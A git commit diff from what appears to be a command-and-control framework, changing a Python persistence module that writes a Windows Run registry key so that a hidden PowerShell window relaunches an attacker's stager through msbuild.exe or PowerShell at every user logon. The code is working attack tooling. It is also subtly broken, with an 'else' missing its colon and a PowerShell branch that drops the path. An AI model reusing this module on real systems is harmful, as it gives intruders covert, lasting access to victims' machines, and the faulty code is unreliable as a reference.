0234c638bd81c5de52cf6d46cfbe8f95aec22fe9
MaximeMF <fumelmax@gmail.com>
2019-04-27 14:42:31 +0200

    Add stager type option to persistence module

--- Server/modules/ipy/persistence.py
+++ Server/modules/ipy/persistence.py
@@ -2,12 +2,17 @@ class STModule:
     def __init__(self):
         self.name = 'ipy/persistence'
         self.language = 'ipy'
-        self.description = 'Set a new command in HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run registry key to launch the stager and get a session each time the user connects'
+        self.description = 'Set a new value in HKCU\...\Run registry key to get a session each time the user connects'
         self.author = '@maximemf'
         self.options = {
+            'Stager': {
+                'Description'   :   'Type of stager : \'msbuild\' or \'powershell\' or \'wmic\'',
+                'Required'      :   True,
+                'Value'         :   'msbuild'
+            },
             'Path': {
                 'Description'   :   'Path to the stager file',
-                'Required'      :   False,
+                'Required'      :   True,
                 'Value'         :   "C:\\\\WINDOWS\\\\Temp\\\\msbuild.xml"
             }
         }
@@ -15,5 +20,6 @@ class STModule:
     def payload(self):
         with open('modules/ipy/src/persistence.py', 'r') as module_src:
             src = module_src.read()
+            src = src.replace('STAGER', self.options['Stager']['Value'])
             src = src.replace('PATH', self.options['Path']['Value'])
             return src
--- Server/modules/ipy/src/persistence.py
+++ Server/modules/ipy/src/persistence.py
@@ -5,8 +5,18 @@ def write_key():
         winreg.HKEY_CURRENT_USER,
         r'Software\Microsoft\Windows\CurrentVersion\Run',
         0, winreg.KEY_SET_VALUE)
-    stager_path = "PATH"
-    value = r'powershell.exe -WindowStyle hidden -NoExit -Command C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe {}'.format(stager_path)
+    _path = "PATH"
+    _stager = 'STAGER'
+    if _stager=='msbuild':
+        command = "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\msbuild.exe {}".format(_path)
+    elif _stager=='powershell':
+        command = ".\\".format(_path)
+    elif _stager=='wmic':
+        #command =  "C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe os get /format:\"{}\"".format(_path)
+        return 'Not implemented yet'
+    else
+        return 'Unknown stager'
+    value = r'powershell.exe -WindowStyle hidden -NoExit -Command {}'.format(command)
     with reg_key:
         winreg.SetValueEx(reg_key, 'ST', 0, winreg.REG_SZ, value)
     return 'Registry key set'
